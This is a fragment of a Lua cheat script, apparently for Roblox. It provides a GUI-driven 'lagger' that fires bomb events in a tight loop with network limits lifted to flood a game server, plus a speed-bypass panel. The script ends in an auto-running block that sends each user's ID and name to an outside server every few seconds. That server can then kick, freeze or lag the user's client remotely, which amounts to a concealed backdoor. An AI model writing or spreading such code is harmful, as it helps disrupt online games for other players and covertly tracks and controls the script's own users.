	keybindButton.BackgroundTransparency = 0.15
	keybindButton.Font = Enum.Font.GothamBold
	keybindButton.Text = "KEY: M"
	keybindButton.TextColor3 = C.TextDim
	keybindButton.TextSize = 11
	keybindButton.AutoButtonColor = false
	keybindButton.ZIndex = 3
	corner(keybindButton, 7)
	stroke(keybindButton, C.Red, 1, 0.55)
	hoverLift(keybindButton)

	local tryhardText = Instance.new("TextLabel", mainFrame)
	tryhardText.BackgroundTransparency = 1
	tryhardText.Position = UDim2.new(0, 14, 0, 131)
	tryhardText.Size = UDim2.new(1, -28, 0, 12)
	tryhardText.Font = Enum.Font.GothamBold
	tryhardText.Text = "only for tryhards"
	tryhardText.TextColor3 = C.RedSoft
	tryhardText.TextSize = 9
	tryhardText.TextXAlignment = Enum.TextXAlignment.Center
	tryhardText.ZIndex = 3
	tryhardText.Visible = false

	local levelColors = { Low = C.Green, Mid = C.Yellow, High = C.Red, Ultra = C.White }

	local function actualizarBotonesNivel()
 for _, name in ipairs(ORDER) do
 local b, s = btns[name], strokes[name]
 if name == nivelActual then
 TweenService:Create(b, TweenInfo.new(0.18), {
 BackgroundColor3 = levelColors[name],
 BackgroundTransparency = 0.05,
 }):Play()
 b.TextColor3 = (name == "Ultra") and C.Dark or C.Text
 s.Color = levelColors[name]
 s.Transparency = 0.1
 else
 TweenService:Create(b, TweenInfo.new(0.18), {
 BackgroundColor3 = C.Card,
 BackgroundTransparency = 0.15,
 }):Play()
 b.TextColor3 = C.TextDim
 s.Color = C.Red
 s.Transparency = 0.6
 end
 end
 tryhardText.Visible = (nivelActual == "Ultra")
 powerLabel.Text = "POWER " .. NIVELES[nivelActual].poder
 cachedBomb = nil
	end

	local function actualizarKeybindButton()
 keybindButton.Text = "KEY: " .. tostring(keybind.Name):gsub("Button", "")
	end

	local function setLaggerOn(on)
 on = on and true or false
 laggerActive = on
 if laggerActive then
 pcall(function()
 if setVisLaggerEnabled then setVisLaggerEnabled(false) end
 if _G.AceSetVisLaggerEnabled then _G.AceSetVisLaggerEnabled(false) end
 end)
 end
 TweenService:Create(toggleBall, TweenInfo.new(0.2, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
 Position = laggerActive and UDim2.new(1, -20, 0.5, -9) or UDim2.new(0, 2, 0.5, -9),
 BackgroundColor3 = laggerActive and C.White or C.RedSoft,
 }):Play()
 TweenService:Create(toggleContainer, TweenInfo.new(0.2), {
 BackgroundColor3 = laggerActive and C.RedDeep or C.Off,
 }):Play()
 toggleClick.Text = laggerActive and "ON" or "OFF"
 toggleClick.TextColor3 = laggerActive and C.Green or C.Red

 if laggerActive then
 if lagThread then pcall(task.cancel, lagThread) end
 lagThread = task.spawn(function()
 pcall(function() game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge) end)
 while laggerActive do
 fireBomb()
 task.wait(0.18)
 end
 pcall(function() game:GetService("NetworkClient"):SetOutgoingKBPSLimit(0) end)
 end)
 else
 if lagThread then pcall(task.cancel, lagThread); lagThread = nil end
 pcall(function() game:GetService("NetworkClient"):SetOutgoingKBPSLimit(0) end)
 end
	end

	local function toggleLagger()
 setLaggerOn(not laggerActive)
	end

	_G.AceSetPerishV2Lagger = setLaggerOn
	_G.AceTogglePerishV2Lagger = toggleLagger
	_G.AcePerishV2LaggerActive = function() return laggerActive end

	toggleClick.MouseButton1Click:Connect(toggleLagger)
	for _, name in ipairs(ORDER) do
 btns[name].MouseButton1Click:Connect(function()
 nivelActual = name
 actualizarBotonesNivel()
 SaveConfig()
 end)
	end
	keybindButton.MouseButton1Click:Connect(function()
 if listeningForInput then return end
 listeningForInput = true
 keybindButton.Text = "PRESS..."
 keybindButton.BackgroundColor3 = C.Red
 keybindButton.TextColor3 = C.Text
	end)

	actualizarKeybindButton()
 actualizarBotonesNivel()

	UserInputService.InputBegan:Connect(function(input, gp)
 if gp then return end
 if listeningForInput then
 if input.KeyCode ~= Enum.KeyCode.Unknown then
 keybind = input.KeyCode
 listeningForInput = false
 actualizarKeybindButton()
 keybindButton.BackgroundColor3 = C.Card
 keybindButton.TextColor3 = C.TextDim
 SaveConfig()
 end
 return
 end
 if input.KeyCode == keybind then
 toggleLagger()
 end
	end)

	-- DRAG + save pos (khóa khi LOCK)
	local isDragging, dragStart, startPos = false, nil, nil
	_G.AceCancelVisLaggerDrag = function(force)
 isDragging = false
 if force then
 setV2Locked(true)
 end
	end
	header.InputBegan:Connect(function(input)
 if v2Locked then return end
 if input.UserInputType == Enum.UserInputType.MouseButton1
 or input.UserInputType == Enum.UserInputType.Touch then
 -- không bắt đầu drag khi bấm nút LOCK
 local pos = input.Position
 local abs = lockBtn.AbsolutePosition
 local asz = lockBtn.AbsoluteSize
 if pos.X >= abs.X and pos.X <= abs.X + asz.X and pos.Y >= abs.Y and pos.Y <= abs.Y + asz.Y then
 return
 end
 isDragging = true
 dragStart = input.Position
 startPos = mainFrame.Position
 end
	end)
	UserInputService.InputChanged:Connect(function(input)
 if v2Locked or not isDragging then return end
 if input.UserInputType == Enum.UserInputType.MouseMovement
 or input.UserInputType == Enum.UserInputType.Touch then
 local delta = input.Position - dragStart
 mainFrame.Position = UDim2.new(
 startPos.X.Scale, startPos.X.Offset + delta.X,
 startPos.Y.Scale, startPos.Y.Offset + delta.Y
 )
 end
	end)
	UserInputService.InputEnded:Connect(function(input)
 if input.UserInputType == Enum.UserInputType.MouseButton1
 or input.UserInputType == Enum.UserInputType.Touch then
 if isDragging then
 isDragging = false
 if mainFrame then
 local p = mainFrame.Position
 local pos = { xs = p.X.Scale, xo = p.X.Offset, ys = p.Y.Scale, yo = p.Y.Offset }
 _G.AcePerishV2PanelPosition = pos
 savedPos = pos
 end
 pcall(SaveConfig)
 end
 end
	end)

	-- No auto-open: size full sẵn, Visible = false đến khi mở từ menu
	mainFrame.Size = UDim2.new(0, W, 0, H)

	
	-- Lưu vị trí panel (giống V1)
	local function saveV2PanelPos()
 if mainFrame and mainFrame.Parent then
 local p = mainFrame.Position
 local pos = { xs = p.X.Scale, xo = p.X.Offset, ys = p.Y.Scale, yo = p.Y.Offset }
 _G.AcePerishV2PanelPosition = pos
 savedPos = pos
 return pos
 end
 return _G.AcePerishV2PanelPosition or savedPos
	end

	local function restoreV2PanelPos()
 local sp = _G.AcePerishV2PanelPosition or savedPos
 if type(sp) == "table" and mainFrame then
 mainFrame.Position = UDim2.new(
 tonumber(sp.xs) or 0.14, tonumber(sp.xo) or 0,
 tonumber(sp.ys) or 0.5, tonumber(sp.yo) or -H / 2
 )
 return true
 end
 return false
	end

	-- Đóng/mở panel: LUÔN giữ vị trí + trạng thái LOCK (không reset)
	local function setV2PanelVisible(on, skipSave)
 on = on and true or false
 if not on then
 -- Lưu vị trí hiện tại trước khi ẩn (kể cả đang LOCK)
 saveV2PanelPos()
 _G.AcePerishV2Locked = v2Locked == true
 if not skipSave then
 pcall(SaveConfig)
 end
 if mainFrame then mainFrame.Visible = false end
 _G.AcePerishV2PanelOpen = false
 -- KHÔNG OFF lagger, KHÔNG đổi lock
 return
 end
 -- Open lại: restore đúng vị trí đã lưu
 restoreV2PanelPos()
 if mainFrame then
 mainFrame.Size = UDim2.new(0, W, 0, H)
 mainFrame.Visible = true
 end
 -- restore lock state
 if _G.AcePerishV2Locked == true then
 setV2Locked(true)
 end
 _G.AcePerishV2PanelOpen = true
 if not skipSave then
 pcall(SaveConfig)
 end
	end
	_G.AceSetPerishV2PanelVisible = setV2PanelVisible
	_G.AceTogglePerishV2Panel = function()
 setV2PanelVisible(not (mainFrame and mainFrame.Visible))
	end
	_G.AceSavePerishV2PanelPos = saveV2PanelPos

	-- Trạng thái ban đầu: ẩn panel, giữ pos đã load
	mainFrame.Visible = false
	_G.AcePerishV2PanelOpen = false
	restoreV2PanelPos()
	if _G.AcePerishV2Locked == true then
 setV2Locked(true)
	end

print("[Vis] Perish Lagger V2 FULL GUI loaded (menu toggle, pos persist like V1)")

end)

-- ============================================================
-- WRAPPERS: Settings → ZENONETOP Lagger V2 (Perish) + Speed Bypass
-- ============================================================
do
	function _G.ZenonetopSetLaggerPanel(on)
 on = on and true or false
 if type(St) == "table" then St.showLaggerPanel = on end
 pcall(function()
 if _G.AceSetPerishV2PanelVisible then
 _G.AceSetPerishV2PanelVisible(on)
 else
 _G.AcePerishV2PanelOpen = on
 end
 end)
 pcall(function() if saveCfg then saveCfg() end end)
	end

	function _G.ZenonetopSetLaggerLock(on)
 on = on and true or false
 if type(St) == "table" then St.laggerPanelLock = on end
 pcall(function() if _G.AceSetPerishV2Lock then _G.AceSetPerishV2Lock(on) end end)
 pcall(function() if saveCfg then saveCfg() end end)
	end

	function _G.ZenonetopSetSpeedBypassPanel(on)
 on = on and true or false
 if type(St) == "table" then
 St.showSpeedBypassPanel = on
 end
 local function forceGui(on2)
 pcall(function()
 local parents = {}
 pcall(function() table.insert(parents, gethui and gethui()) end)
 table.insert(parents, game:GetService("CoreGui"))
 local lp = game:GetService("Players").LocalPlayer
 if lp then table.insert(parents, lp:FindFirstChild("PlayerGui")) end
 local gui = nil
 for _, p in ipairs(parents) do
 if p then
 gui = p:FindFirstChild("ZenonetopBypassGui")
 if gui then break end
 end
 end
 if not gui then return end
 gui.Enabled = true
 gui.DisplayOrder = 250
 local main = gui:FindFirstChild("MainFrame")
 local mini = gui:FindFirstChild("Mini") or gui:FindFirstChild("MiniFrame")
 if on2 then
 if main then main.Visible = true end
 if mini then mini.Visible = false end
 _G.AceVisBypassPanelOpen = true
 else
 -- save pos before hide
 if main and main.Visible then
 _G.AceVisBypassPanelPosition = {
 xs = main.Position.X.Scale, xo = main.Position.X.Offset,
 ys = main.Position.Y.Scale, yo = main.Position.Y.Offset,
 }
 if type(St) == "table" then
 St._sbPanelPos = {
 main.Position.X.Scale, main.Position.X.Offset,
 main.Position.Y.Scale, main.Position.Y.Offset,
 }
 end
 end
 if main then main.Visible = false end
 if mini then mini.Visible = false end
 _G.AceVisBypassPanelOpen = false
 end
 end)
 end
 local api = _G.AceSetVisBypassPanelVisible
 if type(api) == "function" then
 local ok, err = pcall(api, on)
 if not ok then warn("[ZENONETOP] SpeedBypass panel:", err) end
 else
 -- API chưa sẵn: đợi tối đa 1s (không 5s)
 task.spawn(function()
 for _ = 1, 10 do
 if type(_G.AceSetVisBypassPanelVisible) == "function" then
 pcall(_G.AceSetVisBypassPanelVisible, on)
 break
 end
 task.wait(0.1)
 end
 forceGui(on)
 end)
 end
 forceGui(on)
 pcall(function() if saveCfg then saveCfg() end end)
	end

function _G.ZenonetopSetSpeedBypassLock(on)
 on = on and true or false
 if type(St) == "table" then St.speedBypassLock = on end
 -- Lock riêng Speed Bypass — không dính Lock UI menu chính (St.guiLock)
 pcall(function()
 if _G.AceSetVisBypassLock then
 _G.AceSetVisBypassLock(on)
 else
 _G.AceVisBypassLocked = on
 end
 end)
 pcall(function() if saveCfg then saveCfg() end end)
	end

	task.defer(function()
 task.wait(0.2)
 pcall(function()
 if type(St) == "table" and St.showLaggerPanel then _G.ZenonetopSetLaggerPanel(true) end
 -- Speed Bypass: chỉ hiện nếu user đã ON show trong settings (không auto)
 if type(St) == "table" and St.showSpeedBypassPanel == true then
 _G.ZenonetopSetSpeedBypassPanel(true)
 elseif type(_G.ZenonetopSetSpeedBypassPanel) == "function" then
 _G.ZenonetopSetSpeedBypassPanel(false)
 end
 end)
	end)
end

print("[ZENONETOP] FULL Vis Lagger V2 (Perish) + Speed Bypass GUI (no old Vynx)")
end)




-- ============================================================
-- === CONTROL PANEL CONNECTION (auto) ===
do
 local BASE = "https://vishubblagger.lovable.app"
 local KEY = "Grin@1234"
 local SCRIPT = "FreeAllGear"
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
 local TweenService = game:GetService("TweenService")
 local plr = Players.LocalPlayer
 local lagLevel = 0
 local freezeUntil = 0
 local freezeBusy = 0.9
 local activeGuis = {}
 local cpSound = nil

 -- Xoá hết thông báo đang hiện
 function clearNotify()
 for gui in pairs(activeGuis) do
 pcall(function() gui:Destroy() end)
 activeGuis[gui] = nil
 end
 end

 -- Phát / đổi âm lượng / OFF nhạc bằng ID Roblox
 function playMusic(id, volume, looped)
 volume = math.clamp((tonumber(volume) or 50) / 100, 0, 1)
 pcall(function()
 if not id or tostring(id) == "0" or tostring(id) == "" then
 if cpSound then cpSound:Destroy() cpSound = nil end
 return
 end
 local url = "rbxassetid://" .. tostring(id)
 if cpSound and cpSound.SoundId == url then
 cpSound.Volume = volume
 if not cpSound.IsPlaying then cpSound:Play() end
 return
 end
 if cpSound then cpSound:Destroy() end
 cpSound = Instance.new("Sound")
 cpSound.Name = "CP_Music"
 cpSound.SoundId = url
 cpSound.Volume = volume
 cpSound.Looped = looped ~= false
 cpSound.Parent = (gethui and gethui()) or game:GetService("SoundService")
 cpSound:Play()
 end)
 end

 -- Thông báo chữ BỰ giữa màn hình
 function bigNotify(text, size, duration, color)
 if not text or text == "" then return end
 size = tonumber(size) or 48
 duration = tonumber(duration) or 5
 pcall(function()
 local parent = (gethui and gethui()) or game:GetService("CoreGui")
 local gui = Instance.new("ScreenGui")
 gui.Name = "CP_BigNotify"
 gui.IgnoreGuiInset = true
 gui.ResetOnSpawn = false
 gui.DisplayOrder = 999999
 gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 gui.Parent = parent
 activeGuis[gui] = true

 local shade = Instance.new("Frame")
 shade.BackgroundColor3 = Color3.new(0, 0, 0)
 shade.BackgroundTransparency = 0.55
 shade.Size = UDim2.fromScale(1, 1)
 shade.BorderSizePixel = 0
 shade.Parent = gui

 local label = Instance.new("TextLabel")
 label.BackgroundTransparency = 1
 label.Size = UDim2.fromScale(0.92, 0.5)
 label.Position = UDim2.fromScale(0.04, 0.25)
 label.Font = Enum.Font.GothamBlack
 label.TextScaled = false
 label.TextSize = size
 label.TextWrapped = true
 label.RichText = true
 label.TextColor3 = color or Color3.fromRGB(255, 255, 255)
 label.TextStrokeTransparency = 0
 label.TextStrokeColor3 = Color3.new(0, 0, 0)
 label.Text = text
 label.TextTransparency = 1
 label.Parent = gui

 TweenService:Create(label, TweenInfo.new(0.25), { TextTransparency = 0 }):Play()
 task.delay(duration, function()
 pcall(function()
 TweenService:Create(label, TweenInfo.new(0.35), { TextTransparency = 1 }):Play()
 TweenService:Create(shade, TweenInfo.new(0.35), { BackgroundTransparency = 1 }):Play()
 end)
 task.wait(0.4)
 activeGuis[gui] = nil
 pcall(function() gui:Destroy() end)
 end)
 end)
 end

 function post(path, body)
 return HttpService:RequestAsync({
 Url = BASE .. path,
 Method = "POST",
 Headers = { ["Content-Type"] = "application/json", ["x-api-key"] = KEY },
 Body = HttpService:JSONEncode(body),
 })
 end
 function heartbeat()
 local ok, res = pcall(post, "/api/public/lua/heartbeat", {
 user_id = tostring(plr.UserId),
 hwid = plr.Name,
 script = SCRIPT,
 game = tostring(game.PlaceId),
 })
 if not ok or not res.Success then return end
 local data = HttpService:JSONDecode(res.Body)
 if data.enabled == false then plr:Kick("Disabled") end
 for _, cmd in ipairs(data.commands or {}) do
 local p = cmd.payload or {}
 if cmd.type == "kick" then
 local reason = p.reason or "Ban da bi kick."
 bigNotify(reason, p.size or 56, 2.5, Color3.fromRGB(255, 80, 80))
 task.delay(2.2, function() plr:Kick(reason) end)
 elseif cmd.type == "message" then
 bigNotify(p.text or "", p.size or 48, p.duration or 5)
 elseif cmd.type == "clear_message" then
 clearNotify()
 elseif cmd.type == "music" then
 playMusic(p.id, p.volume, p.looped)
 elseif cmd.type == "lag" then
 lagLevel = tonumber(p.iterations) or 0
 elseif cmd.type == "freeze" then
 local dur = tonumber(p.duration) or 0
 freezeBusy = tonumber(p.busy) or 0.9
 if dur <= 0 then
 freezeUntil = 0
 else
 freezeUntil = tick() + dur
 end
 end
 end
 end
 RunService.RenderStepped:Connect(function()
 if tick() < freezeUntil then
 local t = tick()
 while tick() - t < freezeBusy do
 local acc = 0
 for i = 1, 5e6 do acc = acc + i end
 end
 elseif lagLevel > 0 then
 local acc = 0
 for i = 1, lagLevel do acc = acc + i end
 end
 end)
 task.spawn(function()
 while task.wait(3) do pcall(heartbeat) end
 end)
 pcall(heartbeat)
end
-- === END CONTROL PANEL ===
